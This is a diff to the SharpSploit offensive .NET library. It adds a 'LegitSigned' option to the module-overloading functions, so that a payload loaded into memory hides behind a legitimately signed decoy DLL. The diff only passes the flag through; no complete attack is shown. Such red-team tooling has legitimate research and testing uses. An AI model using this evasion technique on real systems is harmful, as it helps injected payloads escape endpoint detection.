@@ -74,9 +74,10 @@ namespace SharpSploit.Execution.ManualMap
         /// </summary>
         /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
         /// <param name="PayloadPath">Full path to the payload module on disk.</param>
+        /// <param name="LegitSigned">Optional, if the decoy module must have a legitimate signature.</param>
         /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
         /// <returns>PE.PE_MANUAL_MAP</returns>
-        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null)
+        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, bool LegitSigned = true, string DecoyModulePath = null)
         {
             // Verify process & architecture
             bool isWOW64 = DynamicInvoke.Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
@@ -92,7 +93,7 @@ namespace SharpSploit.Execution.ManualMap
             }
             byte[] Payload = File.ReadAllBytes(PayloadPath);
 
-            return OverloadModule(Payload, DecoyModulePath);
+            return OverloadModule(Payload, LegitSigned, DecoyModulePath);
         }
 
         /// <summary>
@@ -101,9 +102,10 @@ namespace SharpSploit.Execution.ManualMap
         /// </summary>
         /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
         /// <param name="Payload">Full byte array for the payload module.</param>
+        /// <param name="LegitSigned">Optional, if the decoy module must have a legitimate signature.</param>
         /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
         /// <returns>PE.PE_MANUAL_MAP</returns>
-        public static PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null)
+        public static PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, bool LegitSigned = true, string DecoyModulePath = null)
         {
             // Verify process & architecture
             bool isWOW64 = DynamicInvoke.Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
@@ -127,7 +129,7 @@ namespace SharpSploit.Execution.ManualMap
             }
             else
             {
-                DecoyModulePath = FindDecoyModule(Payload.Length);
+                DecoyModulePath = FindDecoyModule(Payload.Length, LegitSigned);
                 if (string.IsNullOrEmpty(DecoyModulePath))
                 {
                     throw new InvalidOperationException("Failed to find suitable decoy module.");
